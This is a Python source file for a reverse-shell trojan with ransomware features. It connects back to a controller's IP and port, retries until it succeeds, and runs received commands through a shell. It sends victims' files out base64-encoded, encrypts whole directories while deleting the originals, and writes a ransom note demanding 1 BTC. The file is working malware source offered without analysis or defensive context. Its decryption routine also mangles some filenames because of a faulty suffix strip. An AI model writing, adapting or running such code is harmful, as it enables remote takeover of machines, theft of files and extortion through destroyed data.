import socket
import subprocess
import os
import base64
from pathlib import Path
from time import sleep
from cryptography.fernet import Fernet
import glob

IP = "192.168.xx.xx"
PORT = 5443

def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return {
                'success': False,
                'error': 'File not found.'
            }

        with open(filepath, 'rb') as f:
            file_data = f.read()

        return {
            'success': True,
            'filename': Path(filepath).name,
            'data': base64.b64encode(file_data).decode('utf-8'),
            'size': len(file_data)
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }

def connect(ip, port) -> socket.socket | None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"Connected!\n")
        return s
    except Exception as e:
        print(f'Connection error: {e}')
        return None


def listen(connection) -> None:
    try:
        while True:
            data = connection.recv(1024).decode().strip()
            print(f"[DEBUG] Command received: '{data}'")

            if data == "/exit":
                connection.close()
                return
            elif data.startswith("/encrypt"):
                encrypt_directory(connection, data)
            elif data.startswith("/decrypt"):
                decrypt_directory(connection, data)
            elif data.startswith("cd "):
                os.chdir(data[3:].strip())
            elif data.startswith("/ransom"):
                ransomtime(connection)
            elif data.startswith("/download"):
                print(f"[DEBUG] Starting download: {data}")
                filepath = data[10:].strip()
                print(f"[DEBUG] File path: '{filepath}'")
                connection.send(b'Starting Download\n')
                result = download_file(filepath)

                print(f"[DEBUG] Download Result: {result}")

                if result['success']:
                    info = (
                        f"File ready for Download\n"
                        f"Filename: {result['filename']}\n"
                        f"Size: {result['size']}\n"
                        f"[FILE START]\n"
                    )
                    print(f"[DEBUG] Sending header: {info}")
                    connection.send(info.encode())

                    print(f"[DEBUG] Sending data ({len(result['data'])} chars)...")
                    connection.send(result['data'].encode())

                    print(f"[DEBUG] Sending [FILE END]...")
                    connection.send(b'[FILE END]\n')
                    print(f"[DEBUG] Download complete!")
                else:
                    connection.send(f"Download failed, error: {result['error']}\n".encode())
            else:
                terminal(connection, data)
    except Exception as e:
        print(f'Listening error: {e}')


def terminal(conn, data):
    try:
        p = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        conn.send(p.stdout.read() + p.stderr.read() + b"\n")
    except Exception as e:
        print(f'Terminal error: {e}')


def generate_key() -> bytes:
    return Fernet.generate_key()


def encrypt_file(file_path: str, key: bytes) -> bool:
    try:
        cipher = Fernet(key)
        with open(file_path, 'rb') as f:
            file_data = f.read()

        encrypted_data = cipher.encrypt(file_data)

        with open(file_path + '.encrypted', 'wb') as f:
            f.write(encrypted_data)

        os.remove(file_path)
        return True
    except Exception as e:
        print(f'Error encrypting file {file_path}: {e}')
        return False


def encrypt_directory(conn, command: str) -> None:
    try:
        parts = command.split(maxsplit=2)

        if len(parts) < 2:
            conn.send(b"Usage: /encrypt <directory_path> [file_pattern]\n")
            return

        directory = parts[1]
        pattern = parts[2] if len(parts) > 2 else "*"

        if not os.path.isdir(directory):
            conn.send(f"Error: {directory} not a valid directory\n".encode())
            return

        key = generate_key()

        file_pattern = os.path.join(directory, pattern)
        files = glob.glob(file_pattern, recursive=False)

        if not files:
            conn.send(f"No file found in {directory} with pattern {pattern}\n".encode())
            return

        encrypted_count = 0
        failed_count = 0

        for file_path in files:
            if os.path.isfile(file_path):
                if encrypt_file(file_path, key):
                    encrypted_count += 1
                else:
                    failed_count += 1

        key_file = os.path.join(directory, ".encryption_key")
        with open(key_file, 'wb') as f:
            f.write(key)

        result = f"Encryption complete!\n"
        result += f"Encrypted files: {encrypted_count}\n"
        result += f"Failures: {failed_count}\n"
        result += f"Key saved as: {key_file}\n"

        conn.send(result.encode())

    except Exception as e:
        conn.send(f"Directory encryption error: {e}\n".encode())


def decrypt_file(file_path: str, key: bytes) -> bool:
    try:
        cipher = Fernet(key)
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()

        decrypted_data = cipher.decrypt(encrypted_data)

        original_file_path = file_path.rstrip('.encrypted')

        with open(original_file_path, 'wb') as f:
            f.write(decrypted_data)

        os.remove(file_path)
        return True
    except Exception as e:
        print(f'Error decrypting file {file_path}: {e}')
        return False


def decrypt_directory(conn, command: str) -> None:
    try:
        parts = command.split(maxsplit=2)

        if len(parts) < 2:
            conn.send(b"Usage: /decrypt <directory_path> [key_path]\n")
            return

        directory = parts[1]
        key_file = parts[2] if len(parts) > 2 else os.path.join(directory, ".encryption_key")

        if not os.path.isdir(directory):
            conn.send(f"Error: {directory} not a valid directory\n".encode())
            return

        if not os.path.isfile(key_file):
            conn.send(f"Error: Key file not found in {key_file}\n".encode())
            return

        try:
            with open(key_file, 'rb') as f:
                key = f.read()
        except Exception as e:
            conn.send(f"Error while reading key: {e}\n".encode())
            return

        encrypted_pattern = os.path.join(directory, "*.encrypted")
        encrypted_files = glob.glob(encrypted_pattern, recursive=False)

        if not encrypted_files:
            conn.send(f"No encrypted files found in {directory}\n".encode())
            return

        decrypted_count = 0
        failed_count = 0

        for file_path in encrypted_files:
            if os.path.isfile(file_path):
                if decrypt_file(file_path, key):
                    decrypted_count += 1
                else:
                    failed_count += 1

        result = f"Decryption complete!\n"
        result += f"Decrypted files: {decrypted_count}\n"
        result += f"Failures: {failed_count}\n"

        conn.send(result.encode())

    except Exception as e:
        conn.send(f"Error while decrypting directory: {e}\n".encode())


def ransomtime(conn) -> None:
    try:

        file_path = "Ransom"

        directory = os.path.dirname(file_path)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)

        with open(file_path + '.txt', 'w', encoding='utf-8') as f:
            f.write("Your files have been encrypted!\n \nTo retrieve them send 1 BTC to Monkeman.")

        result = f"Text file created: {file_path}\n"
        conn.send(result.encode())

    except Exception as e:
        conn.send(f"Error while creating txt file: {e}\n".encode())



if __name__ == '__main__':
    try:
        connection = connect(IP, PORT)
        while connection is None:
            sleep(0.5)
            connection = connect(IP, PORT)
        listen(connection)

    except KeyboardInterrupt:
        print("Program stopped by user")

    except Exception as e:
        print(f'Main function error: {e}')
